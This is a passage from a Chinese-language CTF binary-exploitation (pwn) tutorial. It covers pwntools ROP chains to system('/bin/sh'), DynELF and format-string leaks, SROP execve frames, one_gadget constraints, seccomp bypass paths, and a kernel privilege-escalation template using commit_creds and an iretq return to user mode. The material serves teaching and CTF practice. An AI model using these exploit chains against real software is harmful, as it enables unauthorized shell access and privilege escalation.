手动拼 `p64(gadget1) + p64(arg1) + ...` 容易出错，pwntools 的 `ROP` 类自动管理对齐和参数：

```python
from pwn import *

elf = ELF('./pwn')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# 自动找 gadget 并设置参数
rop.call('puts', [elf.got['puts']])   # puts(puts_got)
rop.call('main')                       # 返回 main

# 查看生成的 chain
print(rop.dump())
# 0x0000:   0x401233  pop rdi; ret
# 0x0008:   0x601018  puts@got
# 0x0010:   0x401050  puts@plt
# 0x0018:   0x401150  main

payload = b'A' * offset + rop.chain()
```

泄露 libc 后用 libc 的 ROP：

```python
libc.address = leaked_puts - libc.symbols['puts']
rop2 = ROP(libc)
rop2.call('system', [next(libc.search(b'/bin/sh'))])
payload2 = b'A' * offset + rop2.chain()
```

#### 8.1.2 DynELF：无 libc 文件时远程泄露

没有题目给的 libc，只能远程一个字节一个字节地泄露：

```python
from pwn import *

def leak(addr):
    """通过格式化字符串或任意读漏洞泄露指定地址的 1 字节"""
    p = remote('ip', port)
    # 构造泄露 payload，读取 addr 处 1 字节
    payload = b'%7$sAAAA' + p64(addr)
    p.sendline(payload)
    data = p.recvuntil(b'AAAA')[:-4]
    p.close()
    if not data:
        return b'\x00'
    return data

# 自动遍历 libc 内存，识别函数偏移
d = DynELF(leak, elf=ELF('./pwn'))
system_addr = d.lookup('system', 'libc')
log.info(f"system @ {hex(system_addr)}")
```

**注意**：DynELF 需要多次连接（每次泄露 1 字节），必须保证每次连接状态一致。如果题目只能连一次，不能用 DynELF。

#### 8.1.3 Srop：利用 signal frame

SROP（Sigreturn Oriented Programming）利用 `sigreturn` 系统调用一次性设置所有寄存器：

```python
from pwn import *

context.arch = 'amd64'

# 需要：1) 能控制 rax=15（sigreturn 的系统调用号）
#       2) 一个 syscall gadget

# 构造 SigreturnFrame
frame = SigreturnFrame()
frame.rax = 0x3b           # execve
frame.rdi = next(elf.search(b'/bin/sh'))
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr
frame.rsp = 0x123456       # 随便设，execve 后不返回

payload  = b'A' * offset
payload += p64(pop_rax) + p64(15)    # rax = 15 (sigreturn)
payload += p64(syscall_addr)          # 触发 sigreturn
payload += bytes(frame)
```

32 位 SROP：

```python
context.arch = 'i386'
frame = SigreturnFrame()
frame.eax = 0xb            # execve 的 32 位系统调用号
frame.ebx = bin_sh_addr
frame.ecx = 0
frame.edx = 0
frame.eip = int_0x80_addr
```

#### 8.1.4 ELF 高级用法

```python
elf = ELF('./pwn')

# 获取所有符号
for name, addr in elf.symbols.items():
    if 'win' in name or 'flag' in name:
        print(f"{name} @ {hex(addr)}")

# 获取 GOT 表所有条目
for name, addr in elf.got.items():
    print(f"{name}@GOT @ {hex(addr)}")

# 获取 PLT 所有条目
for name, addr in elf.plt.items():
    print(f"{name}@PLT @ {hex(addr)}")

# 搜索字符串
for addr in elf.search(b'flag'):
    print(f"found 'flag' @ {hex(addr)}")

# 搜索指令序列
for addr in elf.search(asm('pop rdi; ret')):
    print(f"found 'pop rdi; ret' @ {hex(addr)}")

# 读内存
data = elf.read(elf.got['puts'], 8)  # 读 puts@got 的 8 字节
```

#### 8.1.5 调试技巧：日志与断点

```python
# 开 debug 模式看所有收发
context.log_level = 'debug'

# 只在特定位置开 debug
p = process('./pwn')
# ... 正常交互
context.log_level = 'debug'   # 从这里开始打印所有收发
# ... 调试关键步骤
context.log_level = 'info'    # 调完了关掉，避免刷屏

# gdb.attach 的断点脚本
gdb_script = '''
b *0x401234
b *main+50
commands 1
  x/10gx $rsp
  continue
end
continue
'''
gdb.attach(p, gdb_script)

# 远程题调试：本地先跑通
# 用 gdb.debug 启动，自动附加
p = gdb.debug('./pwn', '''
  b *0x401234
  continue
''')
```

### 8.2 GDB + pwndbg 调试策略

基础操作见 [GDB+pwndbg 实战使用指南](GDB+pwndbg实战使用指南.md)，这里讲 PWN 题中的调试策略。

#### 8.2.1 找偏移的标准流程

```gdb
# 方法1：cyclic
pwndbg> cyclic 200
# 把输出发给程序，程序崩溃
pwndbg> cyclic -l $rsp
# 72

# 方法2：直接观察
# 在 read/gets 后下断点
pwndbg> b *0x401234
pwndbg> r
# 输入 AAAA
pwndbg> searchmem AAAA       # 找输入在栈上的位置
pwndbg> distance $rsp <找到的地址>  # 计算偏移
```

#### 8.2.2 确认覆盖是否成功

```gdb
# 在 ret 指令处下断点
pwndbg> b *0x401250   # 函数的 ret 指令地址
pwndbg> r
# 输入 payload
pwndbg> 
# 程序停在 ret 前，此时 rsp 指向返回地址
pwndbg> x/gx $rsp     # 查看返回地址是否被覆盖成目标值
pwndbg> telescope $rsp 5  # 看栈上后续的 ROP chain 是否正确
```

#### 8.2.3 堆调试

```gdb
# 每次操作后查看堆状态
pwndbg> heap
pwndbg> bins
pwndbg> tcache

# 追踪 malloc/free
pwndbg> b malloc
pwndbg> b free
pwndbg> commands 1
> printf "malloc(%#lx)\n", $rdi
> continue
> end
pwndbg> commands 2
> printf "free(%#lx)\n", $rdi
> continue
> end

# 查看特定 chunk 的详细信息
pwndbg> malloc_chunk 0x602000
pwndbg> vis_heap_chunks 0x602000 5  # 可视化查看多个 chunk
```

#### 8.2.4 条件断点与自动化

```gdb
# 只在特定条件下断
b *0x401234 if $rdi == 0x601040

# 忽略前 N 次触发
ignore 1 10   # 忽略断点 1 的前 10 次触发

# 自动化脚本：每次 malloc 后打印分配地址
define hook-malloc
  printf "malloc returned: %p\n", $rax
end

# 保存断点到文件，下次直接加载
save breakpoints bp.gdb
# 下次启动：gdb ./pwn -x bp.gdb
```

#### 8.2.5 追踪系统调用

```gdb
# 在 syscall 指令处断点，查看参数
b *0x401234   # syscall 指令地址
commands
  printf "syscall: rax=%d rdi=%#lx rsi=%#lx rdx=%#lx\n", $rax, $rdi, $rsi, $rdx
  continue
end
```

### 8.3 ROPgadget 与 ropper 进阶

#### 8.3.1 ROPgadget 的高级用法

```bash
# 基本搜索
ROPgadget --binary pwn | grep "pop rdi"

# 搜索多指令 gadget（注意 x86 是小端序，搜索机器码更准）
ROPgadget --binary pwn | grep "pop rdi ; ret"

# 只显示指定地址范围的 gadget
ROPgadget --binary pwn --range 0x400000-0x402000

# 自动生成 ROP chain（需要指定 libc）
ROPgadget --binary pwn --rop --libc ./libc.so.6

# 搜索指定字节序列（找特定指令组合）
ROPgadget --binary pwn --bytes 5fc3     # pop rdi; ret 的机器码

# 搜索字符串（找 "/bin/sh" 等）
ROPgadget --binary pwn --string "/bin/sh"

# 输出所有 gadget 到文件（大程序搜索慢，导出后 grep 更快）
ROPgadget --binary pwn --all > gadgets.txt
grep "pop rdi" gadgets.txt
```

#### 8.3.2 ropper 的优势场景

```bash
# ropper 支持语义搜索（不需要精确知道指令名）
ropper --file pwn --search "pop rdi"
ropper --file pwn --search "mov rdi"    # 找所有给 rdi 赋值的指令
ropper --file pwn --search "jmp rsp"

# 搜索特定类型的 gadget
ropper --file pwn --search "stack pivot"   # 栈迁移相关
ropper --file pwn --search "load reg"      # 加载寄存器

# 多文件搜索（同时搜程序和 libc）
ropper --file pwn --file libc.so.6 --search "pop rdx"

# JS 脚本扩展（高级）
# 可以写脚本自动化搜索和构造 ROP chain
ropper --file pwn --script custom_search.js
```

### 8.4 one_gadget 深度使用

```bash
# 基本用法
one_gadget libc.so.6

# 输出示例：
# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rcx == NULL
#
# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL
#
# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

# 指定 libc 基址（直接输出绝对地址）
one_gadget libc.so.6 -b 0x7f0000000000

# 查看更详细的信息
one_gadget libc.so.6 --level 2
```

**约束判断**：

one_gadget 的约束条件决定了能不能用。判断方法：

```python
# 常见约束：
# 1. rcx == NULL
#    → 在调用 one_gadget 前，rcx 应该为 0
#    → 加一个 xor rcx, rcx 的 gadget（难找），或者找一个满足条件的上下文

# 2. [rsp+0x40] == NULL
#    → 栈上 rsp+0x40 处应为 0
#    → 在 payload 中对应位置填 0

# 3. r12 == NULL
#    → r12 为 0

# 判断哪个 gadget 能用的方法：
# 在 GDB 中到调用 one_gadget 前一刻，查看寄存器和栈
pwndbg> b *<one_gadget_addr>
pwndbg> r
# 程序停在 one_gadget
pwndbg> info registers rcx      # 检查 rcx
pwndbg> x/gx $rsp+0x40         # 检查栈
```

**one_gadget 不满足约束时的调整**：

```python
# 方法1：换一个约束更松的 gadget
# 方法2：加 gadget 调整寄存器
# 例如 rcx != NULL 的约束，加一个 xor rcx, rcx 的 gadget
# 但这个 gadget 很少见

# 方法3：调整栈
# [rsp+0x40] == NULL 的约束，在 payload 中 rsp+0x40 的位置填 0
# 需要精确计算栈布局

# 方法4：放弃 one_gadget，用 system("/bin/sh")
# one_gadget 是捷径但不总是能用，ret2libc 更通用
```

### 8.5 patchelf 与 libc 调试

远程题必须用题目给的 libc，否则偏移全错。patchelf 让本地环境与远程一致。

```bash
# 标准流程
# 1. 拿到题目给的 pwn、libc.so.6、ld-2.31.so

# 2. 复制一份再 patch（保留原文件）
cp pwn pwn_patched

# 3. 替换解释器和 libc
patchelf --set-interpreter ./ld-2.31.so --replace-needed libc.so.6 ./libc.so.6 ./pwn_patched

# 4. 验证
ldd ./pwn_patched
# 应该显示 ./libc.so.6 和 ./ld-2.31.so，而不是系统的

# 5. pwntools 中使用
# process('./pwn_patched') 即可用题目 libc 调试
```

**没有 ld 文件时**：

```bash
# 用 pwninit 自动配
pip3 install pwninit
pwninit --bin ./pwn --libc ./libc.so.6
# 自动生成 patched 文件和对应 ld

# 或者从 libc 中提取 ld
# 某些版本的 ld 和 libc 是配套的，可以从系统找或在线下载
```

**libc 版本识别**：

```bash
# 如果题目没给 libc，需要根据泄露的函数地址识别版本

# 方法1：在线查询
# https://libc.rip/
# 输入函数名 + 地址末 3 位（如 puts + 6f0）

# 方法2：libc-database 本地
git clone https://github.com/niklasb/libc-database
cd libc-database
./get    # 下载所有版本（耗时，可以只下需要的）
./find puts 6f0

# 方法3：多函数交叉验证
./find puts 6f0 printf 2c0
# 同时匹配多个函数更准
```

### 8.6 seccomp-tools 深度使用

```bash
# 基本用法
seccomp-tools dump ./pwn

# 超时设置（题目需要输入时，手动输入后才能 dump）
seccomp-tools dump ./pwn -c 5   # 5 秒超时

# 分析输出
# 关注：
# 1. KILL 的系统调用号 → 禁了什么
# 2. ALLOW 的系统调用号 → 能用什么
# 3. 条件过滤（如只允许特定参数的 open）

# 系统调用号速查（x86-64）：
# 0  read     1  write    2  open     3  close
# 9  mmap     12 brk      59 execve   60 exit
# 257 openat  359 io_uring_setup
```

根据规则选攻击路径：

```
只禁 execve(59) → ORW（open+read+write 读 flag）
禁 open(2) → openat(257) 替代
禁 open+openat → 检查是否只过滤 64 位号，试 32 位兼容模式
全禁 → side channel 盲注 / io_uring
```

---

## 九、解题方法论

### 9.1 拿到题目的标准流程

```
1. file ./pwn → 看架构（32/64位）
2. checksec ./pwn → 看保护
3. IDA 静态分析 → 找漏洞函数（gets/scanf%s/printf(buf)/strcpy/read越界）
4. seccomp-tools dump → 看沙箱（如果有的话）
5. 确定攻击路径
6. 写 exploit
7. GDB 调试
8. patchelf + 题目 libc 验证
9. 打远程
```

### 9.2 漏洞函数速查

| 函数 | 漏洞类型 | 条件 |
|------|---------|------|
| `gets(buf)` | 栈溢出 | 无长度限制 |
| `scanf("%s", buf)` | 栈溢出 | 无长度限制 |
| `scanf("%d", &n); read(0, buf, n)` | 栈溢出 | n 可控 |
| `printf(buf)` / `sprintf(dst, buf)` | 格式化字符串 | 格式化字符串可控 |
| `strcpy(dst, src)` | 栈溢出 | src 无长度限制 |
| `read(0, buf, n)` | 栈溢出/堆溢出 | n 大于 buf 大小 |
| `free(p)` 但后续还用 `p` | UAF | 指针未清空 |
| `free(p)` 两次 | Double Free | 无 double free 检查 |

### 9.3 保护与攻击路径对照表

| 保护组合 | 可用攻击路径 |
|---------|------------|
| 无保护 | ret2shellcode |
| NX | ret2text / ret2syscall / ret2libc / ROP |
| NX + ASLR | ret2libc（先泄露） |
| NX + ASLR + Canary | 泄露 canary + ret2libc |
| NX + ASLR + PIE | 泄露程序基址 + ret2libc |
| Full RELRO | 不能改 GOT → 改 `__malloc_hook` / `__free_hook` / FSOP |
| Full RELRO + glibc 2.34+ | House of Apple / FSOP / ld.so 劫持 |

### 9.4 调试 Checklist

本地利用不通时，按以下顺序排查：

```
□ checksec 保护是否看全？
□ 偏移是否正确？（cyclic 重测一次）
□ payload 中地址是否拼错？（hex 逐位核对）
□ 64 位是否需要栈对齐？（加 ret gadget）
□ libc 版本是否正确？（patchelf + ldd 验证）
□ libc 基址计算是否正确？（gdb 中 x/gx 验证）
□ 接收数据是否正确截取？（recvuntil 对齐后 u64）
□ 发送时机是否正确？（sendlineafter vs sendline）
□ 远程 libc 和本地是否一致？（题目附件的 libc 必须用）
□ 沙箱规则是否绕过了？（seccomp-tools dump 确认）
```

---

## 十、内核 PWN 简介

内核 PWN 是更高阶的方向，需要理解 Linux 内核的数据结构和漏洞模式。

### 10.1 与用户态 PWN 的区别

| 维度 | 用户态 PWN | 内核 PWN |
|------|-----------|---------|
| 目标 | getshell（用户权限） | 提权（root） |
| 漏洞对象 | 用户程序 | 内核模块 / 内核本身 |
| 保护 | NX/Canary/ASLR | SMEP/SMAP/KASLR |
| 利用方式 | ROP / 堆利用 | ROP / 修改 cred / msg_msg |
| 调试 | GDB | QEMU + GDB |
| 输出 | shell | commit_creds(prepare_kernel_cred(0)) |

### 10.2 内核 PWN 的核心思路

```c
// 提权的本质：修改当前进程的 cred 结构，让 uid/gid 变为 0

// 方法1：直接调用提权函数
commit_creds(prepare_kernel_cred(0));

// 方法2：修改 cred 结构
// 当前进程的 cred 在 task_struct->cred 中
// 直接把 uid/gid/euid/egid 等字段改为 0

// 方法3：修改 modprobe_path
// 当执行未知格式的脚本时，内核会用 modprobe_path 指定的程序处理
// 改成 /tmp/x，然后创建 /tmp/x 为提权脚本
```

### 10.3 内核保护机制

| 保护 | 作用 | 绕过方式 |
|------|------|---------|
| SMEP | 内核禁止执行用户态代码 | ROP（不跳到用户态执行） |
| SMAP | 内核禁止访问用户态内存 | 通过 copy_from_user 等内核函数间接访问 |
| KASLR | 内核地址随机化 | 泄露内核基址 |
| KPTI | 内核页表隔离 | 侧信道或切换页表 |

### 10.4 内核 PWN 基本流程

```bash
# 1. 解压文件系统
mkdir rootfs && cd rootfs
cpio -idmv < ../rootfs.cpio

# 2. 查看 init 脚本
cat init
# 关注：insmod 加载了什么模块、权限设置、保护参数

# 3. 查看 QEMU 启动参数
# 关注：-cpu 是否带 smep/smap、-m 内存大小

# 4. IDA 逆向内核模块
# 找 ioctl 处理函数中的漏洞

# 5. 写提权 C 代码，静态编译
gcc -static -o exploit exploit.c

# 6. 重新打包文件系统
find . | cpio -o -H newc > ../rootfs_new.cpio

# 7. QEMU 启动测试
```

### 10.5 内核提权 exploit 模板

```c
// exploit.c - 内核提权模板
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>

// 提权函数（在内核 ROP 返回用户态后执行）
void get_root_shell() {
    printf("uid: %d\n", getuid());
    system("/bin/sh");
}

int main() {
    int fd = open("/dev/vuln", O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    // 根据漏洞类型构造利用
    // ... 触发漏洞，劫持控制流，执行 commit_creds(prepare_kernel_cred(0))

    // 返回用户态后执行 shell
    get_root_shell();
    return 0;
}
```

内核态返回用户态的标准代码（内联汇编）：

```c
// 保存用户态状态
unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state() {
    asm volatile(
        "mov %%cs, %0\n"
        "mov %%ss, %1\n"
        "pushfq\n"
        "pop %2\n"
        "mov %%rsp, %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp)
    );
}

// 从内核态返回用户态
void ret_to_user() {
    asm volatile(
        "swapgs\n"              // 切换 GS
        "mov %0, 0x20(%%rsp)\n" // user_cs
        "mov %1, 0x18(%%rsp)\n" // user_ss
        "mov %2, 0x10(%%rsp)\n" // user_rflags
        "mov %3, 0x08(%%rsp)\n" // user_sp
        "mov %4, 0x00(%%rsp)\n" // 返回地址
        "iretq\n"
        ::
        "r"(user_cs), "r"(user_ss), "r"(user_rflags),
        "r"(user_sp), "r"(get_root_shell)
    );
}
```

---

## 十一、实战心态与策略

### 11.1 时间分配

CTF 比赛中 PWN 题的时间分配建议：

```
前 30 分钟：分析保护 + 静态逆向 + 确定漏洞类型
30-60 分钟：写 exploit 初版
60-90 分钟：调试
90-120 分钟：打远程，修偏移/libc 差异
```

### 11.2 卡住时的排查顺序

```
1. 偏移不对 → cyclic 重测，GDB 确认
2. libc 版本不对 → ldd 确认是否用了题目 libc
3. 栈没对齐 → 加 ret gadget
4. payload 有 \x00 截断 → 换 gadget 地址或调整 payload 结构
5. 远程不通本地通 → 检查 libc 差异、发送时机、缓冲区
6. 堆题卡住 → GDB 逐步跟踪每次 malloc/free/edit
```

### 11.3 日常练习路径

```
入门：ret2text → ret2shellcode → ret2syscall → ret2libc
进阶：格式化字符串 → 栈迁移 → ret2csu → SROP
高阶：堆利用（tcache → fastbin → unsorted bin → House of 系列）
挑战：沙箱逃逸 → 内核 PWN
```

推荐练习平台：BUUCTF、Pwnable.tw、pwn.college

---

## 速查表

### 偏移定位

```bash
pwn cyclic 200 | ./pwn          # 生成模式串
pwn cyclic -l 0x6161616a        # 反查偏移
```

### ROP gadget 查找

```bash
ROPgadget --binary pwn | grep "pop rdi"
ROPgadget --binary pwn --rop    # 自动生成
ropper --file pwn --search "pop rdi"
one_gadget libc.so.6             # 直接 getshell
```

### 保护检查

```bash
checksec ./pwn                   # 看保护
seccomp-tools dump ./pwn         # 看沙箱
file ./pwn                       # 看架构
```

### libc 调试

```bash
patchelf --set-interpreter ./ld-2.31.so --replace-needed libc.so.6 ./libc.so.6 ./pwn_patched
ldd ./pwn_patched               # 验证
```

### pwntools 核心 API

```python
p = remote(ip, port)             # 连接
p = process('./pwn')             # 本地
elf = ELF('./pwn')               # 解析
libc = ELF('./libc.so.6')        # libc
p64(addr)                        # 打包
u64(data.ljust(8, b'\x00'))     # 解包
fmtstr_payload(offset, {addr: val})  # 格式化字符串
ROP(elf).call('func', [args])   # ROP 链
gdb.attach(p, 'b *0x401234')    # 调试
```

### GDB 调试核心

```gdb
b *0x401234                      # 断点
r                                # 运行
ni / si                          # 单步（指令/进入函数）
x/gx $rsp                        # 查看栈
vmmap                            # 内存映射
bins                             # 堆 bins
cyclic -l $rsp                   # 偏移
```
